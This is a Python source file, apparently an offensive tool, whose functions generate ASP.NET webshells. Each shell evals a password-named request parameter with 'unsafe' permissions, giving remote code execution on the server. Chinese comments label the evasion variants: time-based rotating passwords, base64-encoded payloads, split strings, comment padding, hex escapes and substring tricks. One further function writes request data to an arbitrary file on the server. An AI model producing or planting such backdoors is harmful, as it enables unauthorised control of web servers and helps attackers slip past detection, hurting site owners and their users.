def aspx_base(pwd):
    '''基本'''
    return '<%@ Page Language="Jscript"%><%eval(Request.Item["'+pwd+'"],"unsafe");%>'+'\n'+'<%@ Page Language="Jscript" validateRequest="false" %><%Response.Write(eval(Request.Item["'+pwd+'"],"unsafe"));%>'


def aspx_time(pwd):
    '''密码随时间变化,密码前面加{D}'''

    import hashlib
    h=hashlib.md5()
    h.update(pwd.encode('utf-8'))
    
    return '<%@ Page Language="Jscript"%><%eval(Request.Item[FormsAuthentication.HashPasswordForStoringInConfigFile(String.Format("{0:yyyyMMdd}",DateTime.Now.ToUniversalTime())+"'+h.hexdigest().upper()+'", "MD5").ToUpper()],"unsafe");%>'


def aspx_confusion1(pwd):
    '''对unsafe和Request.Item简单混淆,unsafe分割,Request是base64编码'''
    import base64
    return '''<script runat="server" language="JScript">
function popup(str) {
var q = "u";
var w = "afe";
var a = q + "ns" + w;
var b= eval(str,a);
return(b);
}
</script>
<%
popup(popup(System.Text.Encoding.GetEncoding(65001).
GetString(System.Convert.FromBase64String("'''+base64.b64encode('Request.Item["{}"]'.format(pwd).encode('utf-8')).decode('utf-8')+'''"))));
%>'''

def aspx_base2(pwd):
    '''基本2'''

    return '''<%@ Page Language="Jscript" validateRequest="false" %>
<%
var keng
keng = Request.Item["'''+pwd+'''"];
Response.Write(eval(keng,"unsafe"));
%>'''

def aspx_notes(pwd):
    '''注释混淆,密码是数字(-18,9)'''
    pwd=int(pwd)
    if pwd<-18 or pwd>9:return 'pwd超范围'
    import random
    while 1:
        a=random.randint(0,9)
        b=random.randint(0,9)
        c=a-b
        d=pwd-c
        if d>0:
            continue
        else:
            r=str(a)+'/*-/*-*/-/*-/*-*/'+str(b)+'/*-/*-*/-/*-/*-*/'+str(-d)
            break

    return '''<%@ Page Language = Jscript %>
<%var/*-/*-*/P/*-/*-*/=/*-/*-*/"e"+"v"+/*-/*-*/
"a"+"l"+"("+"R"+"e"+/*-/*-*/"q"+"u"+"e"/*-/*-*/+"s"+"t"+
"[/*-/*-*/'''+r+'''/*-/*-*/]"+
","+"\""+"u"+"n"+"s"/*-/*-*/+"a"+"f"+"e"+"\""+")";eval
(/*-/*-*/P/*-/*-*/,/*-/*-*/"u"+"n"+"s"/*-/*-*/+"a"+"f"+"e"/*-/*-*/);%>'''


def aspx_xcofu(pwd):
    '''\\x??混淆'''

    return '''<%@PAGE LANGUAGE=JSCRIPT%>
<%var PAY:String=
Request["'''+''.join(['\\x'+hex(ord(p))[2:].upper() for p in pwd])+'''"];eval
(PAY,"\\x75\\x6E\\x73\\x61"+"\\x66\\x65");
%>'''


def aspx_base64(pwd):
    '''base64混淆'''

    import base64
    return '''<%@ Page Language="Jscript" Debug=true%>
<%
var a=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("'''+base64.b64encode('Request.Item["{}"]'.format(pwd).encode('utf-8')).decode('utf-8')+'''"));
var b=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("dW5zYWZl"));
var c=eval(a,b);
eval(c,b);
%>'''


def aspx_addfunc(pwd):
    '''增加函数'''

    return '''<%@ Page Language="Jscript" Debug=true%>
<%
var a=Request.Form["'''+pwd+'''"];
var b="unsa",c="fe",d=b+c;
function fun()
{
return a;
}
eval(fun(),d);
%>'''

def aspx_subs(pwd):
    '''substring混淆'''

    return '''<%@ Page Language="Jscript"%>
<%
var p = Request.Item["'''+pwd+'''"];
var a = p.substring(0,1);
var b = p.substring(1,99999);
var c = "un" + Char ( 115 ) + Char ( 97 ) + "fe";
eval(a+b,c);
%>'''

def aspx_writefile(pwd,file_name):
    '''写文件'''

    return '''<%@ Page Language="C#" validateRequest="false" %><%System.IO.StreamWriter ow=new System.IO.StreamWriter(Server.MapPath("'''+file_name+'''"),false);ow.Write(Request.Params["'''+pwd+'''"]);ow.Close()%>'''
